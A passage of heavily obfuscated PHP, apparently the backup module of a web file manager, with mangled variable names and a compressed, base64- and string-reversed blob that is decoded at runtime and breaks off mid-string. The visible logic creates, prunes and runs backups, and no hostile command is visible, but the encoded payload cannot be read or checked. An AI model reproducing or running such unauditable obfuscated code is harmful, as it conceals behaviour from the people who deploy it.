$úÜ‘›ŒÁ = intval($úÜ‘›ŒÁ); self::$manual = $úÜ‘›ŒÁ && $úÜ‘›ŒÁ == 1 ? 1 : 0; } private function initData($µñŸœĞª = 0, $Æğ­áêÇ = '') { $¶ÁÄˆ±˜ =& $_SERVER[ˆûùúÊ¯]; $öì“æğ = Model($¶ÁÄˆ±˜[809])->config(); if ($Æğ­áêÇ && $öì“æğ[$¶ÁÄˆ±˜[811]] != $Æğ­áêÇ) { $µñŸœĞª = 0; } $this->checkStore($öì“æğ[$¶ÁÄˆ±˜[811]]); if (self::$manual == 1) { self::$name .= $¶ÁÄˆ±˜[11] . date($¶ÁÄˆ±˜[813]); } $€¸Ä‘÷È = array($¶ÁÄˆ±˜[811] => $öì“æğ[$¶ÁÄˆ±˜[811]], $¶ÁÄˆ±˜[42] => self::$name, $¶ÁÄˆ±˜[810] => 0, $¶ÁÄˆ±˜[814] => $öì“æğ[$¶ÁÄˆ±˜[814]], $¶ÁÄˆ±˜[815] => self::$manual, $¶ÁÄˆ±˜[345] => array($¶ÁÄˆ±˜[816] => array($¶ÁÄˆ±˜[810] => 0), $¶ÁÄˆ±˜[817] => array($¶ÁÄˆ±˜[810] => 0, $¶ÁÄˆ±˜[818] => 0, $¶ÁÄˆ±˜[819] => 0, $¶ÁÄˆ±˜[43] => $¶ÁÄˆ±˜[12], $¶ÁÄˆ±˜[820] => 0, $¶ÁÄˆ±˜[821] => 0), $¶ÁÄˆ±˜[822] => array($¶ÁÄˆ±˜[810] => 0, $¶ÁÄˆ±˜[818] => 0, $¶ÁÄˆ±˜[819] => 0, $¶ÁÄˆ±˜[820] => 0, $¶ÁÄˆ±˜[821] => 0), $¶ÁÄˆ±˜[223] => array($¶ÁÄˆ±˜[810] => 0, $¶ÁÄˆ±˜[823] => 0, $¶ÁÄˆ±˜[824] => 0, $¶ÁÄˆ±˜[825] => 0, $¶ÁÄˆ±˜[826] => 0, $¶ÁÄˆ±˜[517] => $µñŸœĞª, $¶ÁÄˆ±˜[820] => 0, $¶ÁÄˆ±˜[821] => 0)), $¶ÁÄˆ±˜[820] => time(), $¶ÁÄˆ±˜[821] => 0); $â÷‹èÒõ = Model($¶ÁÄˆ±˜[809])->insert($€¸Ä‘÷È); $€¸Ä‘÷È[$¶ÁÄˆ±˜[451]] = $â÷‹èÒõ; return $€¸Ä‘÷È; } private function checkStore($ŠÅ¿ó‡½) { $Äè£½€õ =& $_SERVER[ˆûùúÊ¯]; $ù½¾…§· = Model($Äè£½€õ[827])->listData($ŠÅ¿ó‡½); Model($Äè£½€õ[827])->checkConfig($ù½¾…§·); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ˆûùúÊ¯][809])->findByName(self::$name); } return self::$option; } public static function set($„‰¸İ–¹) { $Êã—Ç” =& $_SERVER[ˆûùúÊ¯]; $·Ü›‚Ò× = self::get(); foreach ($„‰¸İ–¹ as $°ìÍÙ£ => $ —Ğéö) { $áÉğğ• = explode($Êã—Ç”[10], $°ìÍÙ£); $¶ÓÏ‹Üİ = count($áÉğğ•); switch ($¶ÓÏ‹Üİ) { case 1: $·Ü›‚Ò×[$áÉğğ•[0]] = $ —Ğéö; break; case 2: $·Ü›‚Ò×[$áÉğğ•[0]][$áÉğğ•[1]] = $ —Ğéö; break; case 3: $·Ü›‚Ò×[$áÉğğ•[0]][$áÉğğ•[1]][$áÉğğ•[2]] = $ —Ğéö; break; } } Model($Êã—Ç”[809])->update($·Ü›‚Ò×[$Êã—Ç”[451]], $·Ü›‚Ò×); self::$option = $·Ü›‚Ò×; return self::$option; } public function keep() { $à×Ãìë =& $_SERVER[ˆûùúÊ¯]; $·ÃŠ¨©ü = self::get(); if ($·ÃŠ¨©ü[$à×Ãìë[345]][$à×Ãìë[816]][$à×Ãìë[810]] == $à×Ãìë[98]) { return; } $this->backupKeep($·ÃŠ¨©ü); self::set(array($à×Ãìë[828] => 1)); } private function backupKeep($ºû›´Â) { $ÄÆ¥ÛŒ =& $_SERVER[ˆûùúÊ¯]; if (self::$manual == 1) { return; } $Ë‰ØÅ¨« = Model($ÄÆ¥ÛŒ[809])->listData(); if (empty($Ë‰ØÅ¨«)) { return; } $øòŸ™±â = 0; $¨ÎÍóª = array(); foreach ($Ë‰ØÅ¨« as $â²öÑ‰¸) { if ($øòŸ™±â >= 7) { break; } $¨ÎÍóª[] = $â²öÑ‰¸[$ÄÆ¥ÛŒ[42]]; $øòŸ™±â++; } for ($øòŸ™±â = 0; $øòŸ™±â < 12; $øòŸ™±â++) { $¨ÎÍóª[] = date($ÄÆ¥ÛŒ[829], strtotime("\x2d{$øòŸ™±â}\40\155\157\156\164\x68\163")); } $¨ÎÍóª = array_unique($¨ÎÍóª); $ßùµÎÀ½ = Model($ÄÆ¥ÛŒ[830])->get($ÄÆ¥ÛŒ[831]); foreach ($Ë‰ØÅ¨« as $â²öÑ‰¸) { if (isset($â²öÑ‰¸[$ÄÆ¥ÛŒ[815]]) && $â²öÑ‰¸[$ÄÆ¥ÛŒ[815]] == $ÄÆ¥ÛŒ[98]) { continue; } if (!empty($â²öÑ‰¸[$ÄÆ¥ÛŒ[42]]) && in_array($â²öÑ‰¸[$ÄÆ¥ÛŒ[42]], $¨ÎÍóª)) { continue; } Model($ÄÆ¥ÛŒ[809])->remove($â²öÑ‰¸[$ÄÆ¥ÛŒ[451]]); $š¢®ì¼ó = $this->backupPath($ºû›´Â, $ßùµÎÀ½); IO::remove($š¢®ì¼ó, !1); } } private function backupPath($é¨è–ò¿, $Ê˜ÒÌÇŠ = false) { $Æ¸ó•Ó‰ =& $_SERVER[ˆûùúÊ¯]; if (!$Ê˜ÒÌÇŠ) { $Ê˜ÒÌÇŠ = Model($Æ¸ó•Ó‰[830])->get($Æ¸ó•Ó‰[831]); } $Ê½²«ÔÔ = $é¨è–ò¿[$Æ¸ó•Ó‰[42]]; $¿¹†ŒŒÖ = substr(md5($Æ¸ó•Ó‰[832] . $Ê˜ÒÌÇŠ . $Ê½²«ÔÔ), 0, 8); return "\173\151\157\x3a{$é¨è–ò¿[$Æ¸ó•Ó‰[811]]}\175\57\x64\x61\164\141\x62\141\x73\x65\x2f\x62\x61\143\153\165\x70\57" . $Ê½²«ÔÔ . $Æ¸ó•Ó‰[11] . $¿¹†ŒŒÖ; } public function db() { $ÔàÈ•¾¡ =& $_SERVER[ˆûùúÊ¯]; $¨ûş”ÛĞ = self::get(); if ($¨ûş”ÛĞ[$ÔàÈ•¾¡[345]][$ÔàÈ•¾¡[817]][$ÔàÈ•¾¡[810]] == $ÔàÈ•¾¡[98]) { return !0; } $¤õ»Œİä = new BackupDb(); if (!$¤õ»Œİä->index()) { return !1; } self::set(array($ÔàÈ•¾¡[833] => 1)); return !0; } public function dbFile() { $˜÷¬Èâç =& $_SERVER[ˆûùúÊ¯]; $ÂÖö—¶Â = self::get(); if ($ÂÖö—¶Â[$˜÷¬Èâç[345]][$˜÷¬Èâç[822]][$˜÷¬Èâç[810]] == $˜÷¬Èâç[98]) { return !0; } $š¶¤¬­Œ = new BackupDbFile(); if (!$š¶¤¬­Œ->index()) { return !1; } self::set(array($˜÷¬Èâç[834] => 1)); return !0; } public function file() { $éŒüëã† =& $_SERVER[ˆûùúÊ¯]; $‘Ûüç¼› = self::get(); if ($‘Ûüç¼›[$éŒüëã†[345]][$éŒüëã†[223]][$éŒüëã†[810]] == $éŒüëã†[98]) { return !0; } if (!isset($‘Ûüç¼›[$éŒüëã†[814]]) || $‘Ûüç¼›[$éŒüëã†[814]] == $éŒüëã†[221]) { $÷¶ğÑó = new BackupFile(); if (!$÷¶ğÑó->index()) { return !1; } } self::set(array($éŒüëã†[835] => 1, $éŒüëã†[810] => 1)); return !0; } } goto e³°áéŠğö; F—‘„˜Îò·: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\210\373\371\372\312\257", "\xde\x93\x9a\xe9\xbb\xfd"); $_SERVER[ˆûùúÊ¯] = explode("\174\3\174\2\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\7\174\133\325\365\70\136\312\50\4\132\132\12\241\264\205\276\30\202\355\104\303\166\266\23\47\221\145\71\26\221\45\43\311\131\266\171".base64_decode('eZKepWdLerLek1cSyiwzlFHCKKOsslehzBIKtIVCgQIFwiirGVDolwIdjI7fHeeO9w==')."\x24\xc3\xf7\xff\xf9\xff\x3e\x9f\x5f\x20\xd1\xbd\xe7\x8e\x77\xc7\xb9\xe7\x9e\x7b\xee\x39\xe7\x5e\x78\xfc\x3\x8f\xff\xf9\xc3\x8d\xbb\x6f\xfc\xf2\xc6\xdd\x6e\x78\xf7\xa2\xd3\xce\x3a\x87\x86\xd1\x5f".strrev('ÃÙ%ßzY™!»¿Ãù.ïçu¡ù}¬Şw‡ïİ›OæºÓŒó|şD¿½Œï	ü')."\xbe\xf4\xef\x99\xd1\x7f\xb5\xa2\x9c\xb4\x60\x2b\xfd\x51\x8a\xa6\xad\xe8\xe3\x86\x65\x5b\x14\x90\x36\x8b\x83\x46\x96\x86\x8d\x22\xfd\xf5\xd3\x9f\xde\x78\xa4\xac\x17\x4c\x5b\xa7\x51\x1f\xfd\x51\xa1"."\121\64\242\15\32\171\75\141\114\352\341\242\33\102\343\70\246\146\165\133\105\37\262\365\42\373\154\173\40\21\16\252\75\201\144\27\215\153\245\222\337\312\14\133\176\255\234\316\31".base64_decode('o3rESPlTRtGf0WzNl2INm0Z/5kLTc3p6WNVSZtnWMxRUKeaN4rDcEhq2RvIG64cajQ==')."\45\325\104\157\117\117\50\236\204\316\264\312\351\5\63\3\241\222\126\326\12\320\340\222\136\266\320\250\311\325\251\45\263\244\27\35\20\1\300\15\117\151\26\324\324\321\256\166\204"."\x7a\x22\xb1\xb5\x6a\x72\x6d\x4f\x8\x72\xa4\xd4\x91\x8a\x5e\x9e\xa0\x31\x12\x4c\xd8\x5a\xd9\x4e\x1a\x5\x9d\xe7\x18\x2b\xf3\x76\xb5\x87\x56\x84\xa3\x4a\x32\x1e\x88\x26\x2\xc1\x64\x38\x16\xa5\xe0".base64_decode('YKy7O5yshsdjkUh7ILiyOqUnHljRHVBQ+9DUGMVBs0FZT1PWK4000GnoeRjSosaaYw==')."\117\224\40\224\344\41\204\116\305\112\76\117\43\121\36\312\350\203\132\45\17\243\325\41\107\112\145\243\240\261\116\257\324\47\70\24\360\240\142\233\106\61\115\43\241\161\273\254\11"."\70\152\153\32\41\44\102\42\12\113\204\42\241\140\122\301\15\124\72\343\261\156\5\46\241\240\131\266\136\126\126\167\205\342\41\5\67\272\255\236\364\265\136\1\274\216\242\241\120"."\2\221\210\62\125\15\266\136\50\261\152\150\231\32\225\305\342\35\241\270\322\276\126\21\43\224\66\13\5\263\350\103\265\240\231\264\245\246\206\342\161\32\360\300\62\214\204\361\244"."\101\44\326\331\231\10\361\30\164\356\350\10\152\311\34\300\117\107\54\63\230\267\325\121\55\137\141\150\12\10\137\17\77\360\153\132\200\272\43\106\321\250\0\232\102\25\246\311\227"."\77\4\52\54\267\316\40\172\6\2\5\124\336\4\12\201\126\361\50\15\266\55\245\277\213\41\123\12\257\360\121\275\154\253\172\61\155\146\214\42\20\225\145\200\164\232\235\353\50"."\xa3\x95\x5d\x6\xba\x60\xe6\x33\x2c\x6c\x39\xa8\x45\xb4\x52\x90\xb3\xf0\x28\xa2\xb\xf9\x4c\x99\xad\xaf\xcf\xcb\x49\xa3\x11\xbe\x5c\x71\x5e\x11\x2b\xa1\x96\xf0\x95\x6e\xc\x4e\x88\xf5\x86\xf3\xf5"."\xf0\x54\xcb\xac\x94\xd3\x88\xae\xd\x42\xdf\x9b\x1\xac\xdb\x36\xea\x1c\x8c\x8d\x61\xf6\x96\xf2\xa6\x96\x49\xe8\x65\xde\x35\xc3\xec\x44\x15\xc5\x2a\xb6\xc\xac\x90\x6c\x9d\x66\xb9\xd0\x81\x28\x3".base64_decode('fB+tCqO3RsIwWxcZacT8DX3He/8z0Lcc/dMIJLof2pTT83lVH9dh4RQy8yw2GH4L0w==')."\121\4\241\321\160\114\315\151\126\256\73\63\117\45\245\30\345\317\350\343\276\122\256\4\253\232\57\344\176\7\142\343\241\213\232\166\110\332\77\362\146\132\313\313\135\244\341\234\155"."\227\22\172\61\323\311\111\160\306\34\53\222\221\52\351\214\132\167\170\224\214\322\255\254\125\272\132\215\126\213\25\54\344\171\210\365\216\303\54\16\264\307\331\164\146\6\151\200\357".base64_decode('EnXwQcMiFE4sT7TJ5I20Zhtm0W+mbd32WnZZ16DGQDqtW5Y3iPapspn3BvJ5c8wbKw==')."\33\131\243\330\252\314\2\142\113\67\61\57\46\200\255\260\122\353\26\53\30\161\360\147\146\265\125\354\101\357\102\266\2\171\356\262\126\264\6\365\262\67\4\53\243\125\101\215\345"."\124\220\145\353\60\254\222\151\31\270\171\255\212\146\333\132\72\207\51\210\250\276\355\163\362\33\170\347\323\253\362\206\306\113\106\131\267\130\133\225\25\335\111\250\4\325\256\173\173"."\312\132\266\240\265\52\245\112\12\215\14\254\324\32\60\232\33\206\246\125\111\343\250\107\51\124\54\333\133\326\21\51\62\320\166\7\203\34\36\364\166\343\165\145\350\31\157\2\121".strrev('EÈÂúÑx×’¯0è‚9µ–ZÙHÚÑÉm¸j=“%v…XQÔ «šiÏ'."\0".'l')."\175\25\300\36\163\114\57\243\17\267\117\264\52\303\146\46\145\216\373\130\122\47\260\45\54\63\236\356\222\355\215\153\305\54\36\237\324\204\255\3\12\132\243\131\347\100\107\364\142"."\326\316\261\202\211\120\174\125\50\256\46\142\235\311\325\201\70\154\346\105\204\45\343\354\123\270\352\274\67\256\147\320\320\247\155\126\116\53\341\121\143\171\360\342\300\163\305\122\361"."\x82\x61\x69\x91\xf0\xa\x3c\x30\x1d\x5e\xb\x65\xf2\xca\xb9\x58\xdd\x11\xa3\x60\xe0\xb6\xdb\x3c\x85\x8c\x24\xda\xe9\x57\x40\x83\xfc\xa4\x43\x6d\xfd\xd6\xac\x86\xfe\xcc\xec\x46\x2f\xfa\x77\x56\x63".base64_decode('X3+Hb9bAMr8hyvibfc1KS9N8pQexHoaWV6DTVTmalNhK57AIbC6aRf1zBgfvXdKydw==')."\15\53\5\306\103\107\367\206\22\111\265\73\224\354\212\165\300\327\103\1\10\105\114\272\154\131\157\373\350\317\0\314\356\0\375\121\15\253\123\332\126\160\224\223\37\325\114\15\241".strrev('ËYfó6—W09²7K´P$ß«B„I8Ì³nÄá'."\0".'{W‘²Ğ\\:4¤ÖèÉ')."\143\322\310\126\205\316\310\125\326\0\162\125\312\127\20\316\370\361\27\222\271\112\41\5\24\35\161\200\210\133\26\14\226\65\201\270\220\2\333\271\320\366\147\207\73\34\373\23\304"."\374\52\236\347\176\137\251\230\155\74\2\352\122\133\346\65\141\0\240\50\164\21\161\232\25\275\172\14\174\151\23\155\65\335\332\260\336\212\73\5\364\143\61\201\262\210\104\130\26"."\343\275\240\315\275\267\343\171\312\373\12\250\22\122\147\320\344\273\27\75\163\54\166\356\5\212\136\56\233\345\31\220\203\204\25\262\241\340\171\203\312\155\276\75\133\150\371\260\160".strrev('bm²ìQàšét¤rÍ<IC=xP‚}± ³lì_úb;6ÉÒÙıÕ¨iÿb9ÛäÎ')."\150\331\221\5\341\123\316\4\274\106\363\6\115\252\360\266\261\126\146\364\274\316\160\41\247\263\135\262\11\262\241\261\343\230\42\16\55\210\331\105\120\301\236\30\126\34\225\304\173"."\x1a\x8b\xaf\xc6\xa7\x3\x1\xc0\x1b\x3b\xcc\xbc\x8\xe6\xd1\xb8\xc7\x8\xee\x8b\x78\x4f\x59\x1f\x34\x80\x5c\x15\x11\x6a\x76\x6b\xe5\x61\xd6\x31\x54\x52\xac\x1a\x1c\x91\x56\x54\x67\x6f\x24\xa2\x6"."\143\321\44\72\134\120\310\352\170\70\31\142\53\70\320\241\6\202\75\234\5\1\60\46\260\325\273\47\205\214\266\300\44\243\106\370\305\66\217\166\254\222\131\264\164\57\34\32\275"."\xe2\xe8\x51\x95\x94\x11\xbb\x20\xd0\x59\xb1\x73\xba\x36\xc3\x71\xaf\x56\x98\xf4\x16\x10\x9\xf0\xf2\xe6\x39\x79\x10\x5\x76\x47\xca\xca\x84\x61\x9a\xc4\xe6\x86\x7\xf\xad\x42\xc6\xfc\xf4\xc4\x12"."\x50\x60\x19\x86\x22\x6\x34\xc5\x17\x4b\x4f\x2f\x24\x15\x24\x14\x59\x11\x2\xa0\x95\xd3\x80\x9f\xc\xac\x4e\xb0\x1d\xa9\x82\x32\x96\x8d\x49\x4d\xf4\x65\x19\x6b\x8\xeb\x41\x21\x2f\x18\x59\x67\x77".strrev('±«fjinjÀº#¬µ\\Öc`0ãÇ_êÃ.Éı2×BŸ7™hÑ7 İ]½s•QÊb¼')."\122\173\326\172\13\136\134\13\36\53\137\123\123\23\253\153\366\174\45\207\310\21\340\255\131\314\220\371\200\121\112\125\322\303\154\151\150\151\306\311\341\243\256\345\35\63\30\45\75"."\x82\x33\xbd\x47\x54\xe3\xc9\x11\xce\x3d\x3\xaa\xa8\x10\x8e\x4d\xd5\xd2\xf8\x63\x2a\xaa\xd1\xae\x58\xf2\xd0\xa0\x5\x94\x41\x85\xc\xc6\xa0\x52\xa8\x96\xcf\xa2\x51\xb6\x73\x5\x19\x28\xa6\x98\xc6".base64_decode('dco38cnio4jHttY2xhY8Ypkm2F5dqw1rarVhjasNa6rbQEGWkS2iXrLNKNkVjq5Uuw==')."\143\35\241\210\32\216\242\275\67\131\15\357\355\351\10\260\45\52\303\333\143\114\366\2\320\136\264\373\256\12\104\302\356\354\241\65\341\104\62\121\63\11\301\172\103\256\224\216\166".strrev('¨–IŒ¹1~,QÔ,‹‚DlE_™ß–3ç«–ø‡t'."\r".'È—`ƒP‘Ò(pÎÑá¯ê\'µ').base64_decode('7PyrCiqB2EUdBhy6i4U+pCcqQ9IKY3L4UanAtoGCBsRRY6xgA/1pVAIJxS6pnOCnJg==')."\170\220\164\203\305\321\36\6\337\127\200\245\251\152\201\212\363\264\353\203\234\265\250\15\10\14\332\234\241\161\305\21\171\23\151\150\6\2\104\272\204\60\201\314\10\174\306\100\304"."\262\154\7\130\163\6\205\144\107\215\365\204\342\1\54\27\122\127\307\143\321\25\120\140\54\247\263\6\204\141\370\33\330\361\1\304\103\266\330\163\20\357\257\61\71\201\30\364\41"."\223\15\345\106\372\163\44\220\2\164\320\4\312\122\144\243\236\302\333\57\143\237\130\140\20\221\75\266\165\232\25\376\265\224\151\346\31\45\106\34\60\337\22\270\170\151\310\142\110".base64_decode('Ms42k9mclAHqxlaGoirDLBqTsJECQvF4LA4DYpvDTOpAE+OhBKPjmGwabLj8vtmAxQ==')."\72\342\62\340\363\376\143\372\307\146\67\364\171\147\373\6\120\240\161\326\162\32\205\130\277\317\21\145\234\133\245\314\113\343\203\101\203\265\254\261\265\337\337\357\157\130\326\332\27"."\360\116\152\336\311\46\357\42\357\0\342\367\32\147\3\140\140\103\213\147\356\46\234\1\145\134\166\370\0\372\151\353\137\66\263\337\173\344\261\353\227\367\365\17\324\267\316\236\321".base64_decode('7zu8f2xgVuMy9p10pYxYSkaxUFMzsxtQk9CBgWcpkk1NysASJo2SgG6Yv4nB0RzqWQ==')."\121\242\317\333\77\173\140\231\124\116\2\271\277\205\50\51\332\141\163\74\137\300\273\16\367\214\27\305\353\36\360\243\122\114\213\155\11\257\213\224\226\6\72\200\150\244\140\327\355".base64_decode('MpdEOc+pG2bS301sIrP6ON+/Bo0yYGelaIwwdrmoj0DAtBl+p3R7TGfogeCOOEIORg==')."\xf7\x51\x92\x14\xcb\x4b\x7b\x6\x11\x19\x48\xdb\x2d\xe3\xee\x4a\x2a\x3e\x42\x8c\xf1\x18\xda\x46\x60\x9e\xf6\x81\xdc\x56\x5a\x2b\xe9\x9\xa9\x87\xaa\x9a\xc\xb4\x47\x42\x2a\xa3\x30\x40\x89\x59\x9c"."\120\305\166\56\224\106\135\23\24\225\321\207\264\70\244\222\363\70\254\174\153\44\257\20\302\100\131\366\126\162\217\140\125\112\230\373\126\320\214\243\261\125\320\6\256\264\55\125\350"."\220\103\71\125\236\200\222\306\70\101\54\117\322\305\242\307\24\12\332\124\22\63\144\41\236\231\161\255\376\206\376\376\112\237\236\31\350\103\210\257\171\7\7\66\314\331\324\310\316"."\xb1\xfe\x7e\xf4\x87\x45\x2\x35\x24\xc5\x2a\xa7\x86\x2a\xe2\xc0\x7c\xb8\x1d\x5c\x58\xe8\x88\xf0\x64\x1a\x35\xcb\x9c\xf5\x2d\x39\x8e\x89\xb6\x69\x6b\x79\x47\x15\x49\xc\x61\xa4\x89\xf1\x51\x20\x36".base64_decode('o7MdERQL82ySiJ2Q0ygXU3FGSJLx4hIJ3fbxHB4pUUVxx7VMWx0j9kW0nILSVkeFlw==')."\11\162\250\164\310\345\55\35\337\274\164\126\362\171\233\237\125\363\306\60\174\1\326\12\134\23\170\141\67\230\135\253\150\247\131\146\62\237\131\320\214\272\131\265\62\206\213\105\63".strrev('¼;‡²!’%–›@Ô"BÌBaÏŞ'."\n".'¢	,{J£„­¤L'."\r".'*Iˆ+²lMQ’“')."\254\336\65\136\166\102\346\1\3\206\335\54\121\276\121\267\125\164\350\34\146\163\51\237\261\361\341\301\203\117\272\36\314\133\170\120\253\75\370\160\354\21\107\63\217\20\42\173\106"."\15\175\214\4\370\261\311\3\247\51\217\70\326\103\60\334\341\61\254\16\162\52\44\37\40\111\254\11\350\70\215\116\65\171\155\302\103\233\23\321\107\365\274\207\35\370\75\254\215".base64_decode('Hibv8BA5RQc0qxctJ2gWCSKqmfNgBML46xFibQ86hetlkgUGRhwoPeKw6cmWzUqphw==').strrev('HÅ8|õVLÒU\'ğ7wñŞígjN¶ RË#Å˜{i¦â™´@fÑŠS}')."\33\150\215\40\247\332\304\166\71\107\36\42\305\341\334\47\36\160\21\132\45\26\52\356\100\247\6\27\50\264\132\71\314\21\264\350\104\124\41\301\26\167\27\202\327\165\213\11\334"."\xb7\x1a\xf8\xa3\x49\x2d\x9b\x90\x3e\x67\x6b\x59\xf6\x2d\x4c\xac\x50\xea\x94\x59\x69\x38\xae\xa7\x27\xd2\x42\xee\xd0\x21\x49\x33\x9c\xb1\xa\xaa\x21\xa1\xd\xba\xba\xe5\x21\xeb\xa8\xd6\x1a\xa8\x3d"."\307\34\257\371\224\114\333\147\37\66\306\14\331\371\374\72\326\310\27\257\116\350\27\41\201\261\222\140\42\150\143\61\31\116\240\115\255\63\317\6\245\105\116\6\2\354\161\306\360".base64_decode('4vIRgkwuAxNcJBUJdSaVo2KIehmmSsuoOLNC/jGLiqNuNlxKG0kXca2YoZD1iNKvbw==').base64_decode('q2MfqXMUF2jibISHRZVqxMPDLQ8CRgfSfbE7MVBMbIYV4Pw0C85gWKAHIZ3BxNTKeA==')."\51\221\33\1\140\355\162\174\27\107\305\232\142\50\241\340\17\170\44\136\5\223\24\257\130\35\122\324\71\344\56\214\164\155\241\170\210\172\214\342\204\121\114\30\205\122\276\12\52".base64_decode('dmHBBODFLWIUK6cK000Ei2ho/R64hPNgfQVpgxaiN9R6ojtRcEisq1vOyKrXGXUsaA==')."\100\371\234\126\26\243\311\310\20\246\5\74\277\205\263\210\250\224\155\120\33\25\34\212\243\214\104\114\54\173\202\153\134\110\101\147\245\64\332\341\41\277\135\150\30\344\365\312\347"."\7\23\22\226\211\322\40\104\14\42\150\260\320\17\351\110\322\364\140\321\60\372\241\373\70\273\220\45\231\30\342\127\12\35\40\152\306\341\125\210\2\60\306\14\215\170\3\243\40"."\xc0\x4d\xa8\x92\x4c\x80\x53\x20\x27\x3f\x40\x5b\x12\xe0\xf4\x1d\xed\x92\x68\x8f\xa3\x61\xc4\xbc\xe7\xd1\xd6\x56\xf6\xe1\x5\xb3\x2\x6f\x50\x6c\x7c\x28\xad\x93\x11\x30\xa1\xa3\x3e\x43\x39\x51\x5b"."\242\52\115\316\55\4\177\230\366\213\275\202\215\253\130\157\316\371\247\241\254\150\20\36\132\265\272\35\30\235\153\307\73\313\46\347\164\371\66\357\316\24\44\107\111\176\307\356\332"."\232\245\361\160\260\23\125\40\251\214\233\261\160\101\135\121\61\21\216\135\207\202\330\315\200\226\51\30\105\137\231\356\146\76\164\100\0\275\10\117\223\304\173\11\242\263\201\336\276"."\300\356\267\311\65\317\266\151\242\123\147\331\127\106\137\26\15\222\10\36\120\13\162\155\216\67\105\231\143\340\265\130\50\101\42\335\116\306\210\225\114\224\64\106\261\71\323\306\60".base64_decode('mRwxKoKKkiZLagwkHuEMLiYQoYxhYwhecia7rBAZxS4pYDKZJrtN1RSL04JnpiOnkw==')."\103\0\340\54\262\215\373\4\103\123\133\41\44\155\226\140\336\45\115\250\202\71\252\113\100\237\145\233\45\221\42\105\151\262\224\44\52\225\162\361\251\40\55\102\253\50\103\330\140"."\x31\x64\x24\x2f\x94\x25\x67\x68\xba\x50\x7d\xf8\xd4\xe0\x93\x69\x73\xa0\x5c\x66\x68\x4a\xbb\x89\xaf\x1b\x11\x50\x6\x61\x8a\x97\x60\x6b\xac\xd6\x16\x45\x2b\xf\x8d\xa\x3d\x27\x5a\x15\xfe\xb0\x8f".base64_decode('LnKflsnE2JWrHK7OKssTa1dElM54VVKsdvZAPi8UVdzxKYvQxS0XkiFTFuskB1h2cQ==')."\134\13\306\217\56\123\263\343\356\53\125\47\101\236\232\115\231\202\224\211\151\254\35\107\73\173\60\147\24\165\213\157\320\145\253\26\145\372\177\314\17\127\217\74\136\41\123\241\13"."\116\223\44\317\130\57\164\124\227\317\11\134\274\52\50\21\337\250\253\330\17\140\1\244\210\152\73\330\250\70\251\137\132\116\16\14\101\313\227\216\7\336\230\302\61\237\65\5\316".base64_decode('uvPpTPhMaOA430/lQjgJz6VcqWDbRLybXSDWLMy/JPg5OR9CZJwwVcNZMq/lhGtefQ==')."\xfc\xcc\xd7\x69\x78\xfb\x93\xcf\xff\xe5\xc5\x73\x69\x78\x4e\x13\xdc\x4a\x6d\xdc\x63\xe3\x9e\x28\x44\xc2\x42\x45\xf8\xe4\xd5\x7d\xe6\xab\xbf\x39\xe8\xd8\xdc\x67\xcb\x2e\xd9\x36\xfd\xc0\x79\xf7\xbf"."\166\343\325\205\77\77\174\343\3\135\263\157\276\163\165\370\256\127\117\275\160\346\51\367\377\341\153\213\136\175\263\344\277\101\75\363\256\323\76\72\273\56\64\360\23\337\272\73\73".strrev('_CÉö×¾óÍäû//‹¬Ëäºìçs<ê«Q×{e¿¡ğ1?ßîq?/wùs½÷')."\177\163\267\345\3\13\77\270\142\305\163\273\347\122\137\136\364\225\105\353\57\363\336\164\363\255\331\243\102\321\335\156\171\345\357\207\56\35\73\147\331\235\7\130\277\176\353\277\257".strrev('>Ë®?ŞŞù\\ìoıøWÁæId¸œßñşîg‡Ç5ôöŸÃûnûÍ§Ñó=ï4').base64_decode('+MK7w5/9ca/6V+/47u5PPfc/jz1Qv/cP51x/QNelWxIrlj147QMP1v1247ZC7ydXvw==')."\270\53\175\357\1\335\337\276\271\155\351\353\371\273\346\77\336\355\215\176\330\326\365\154\142\337\247\236\335\166\315\364\321\137\234\324\373\315\341\326\65\47\337\30\72\373\211\203\322"."\37\356\75\347\365\277\155\34\70\345\262\107\177\173\342\365\113\375\333\217\377\332\35\153\277\365\317\241\213\367\357\176\342\252\312\276\215\326\76\155\153\177\371\174\377\156\323\227\237".base64_decode('lbihsMf0s0t3X3vF0odfeSv3/h8+eNG2vH1zv/Lwb05eccUfp/39oJYZ+v7bmrbe0g==').base64_decode('Hts1/JX2q1pO+PSeE74648oNv8p/c/R7rQdN2/3pH2spe9MRHfm3P944uO5XV331gw==').base64_decode('2w9Z/tiewW2/mjbj3F9tXfjTbZvTd1xRv+Wgd5q3vnrl/AN8xwd3HrH0lPm39Xz/zQ==')."\151\155\307\151\175\321\357\357\161\115\45\370\203\357\336\175\106\363\346\375\176\272\307\303\133\366\275\146\161\347\161\277\134\372\332\311\372\111\177\275\351\351\361\333\67\157\152\332\357".strrev('îdÇIîşŸİ‰ö¯jş5÷tnıŒ\'üåÌx<=FËùÊÅ‚ı³ü¾µÏ·').base64_decode('PSgT2NV6r/HSlqsPaLpp2lOVaec9ED3zLztffPXkT9tXjHz0p+3TTjiu6+43DgnOyA==')."\xaf\x7b\x6a\x61\xf8\xa5\x79\xa7\x37\x3f\xbd\xe7\xbf\x2e\x3c\xe3\xc0\xee\xeb\xaf\x6a\x28\x1c\x7f\x51\xcf\x7d\x83\xf7\xdb\x1f\xfc\x34\x3d\xff\xc4\xed\x47\xec\xf7\xe6\x97\xb4\xad\x37\xad\x3b\xec\x5b".strrev('½ÁàƒúºÍÊŸûŒñ:ëll_«Ÿaı‡#åtÙNkáå¿óÁõ^séx³=ß˜ãÙ?').strrev('Øg:-7cÚMaÈôŸGi¥Çı|·ÃŞşŞ"{.ß÷A÷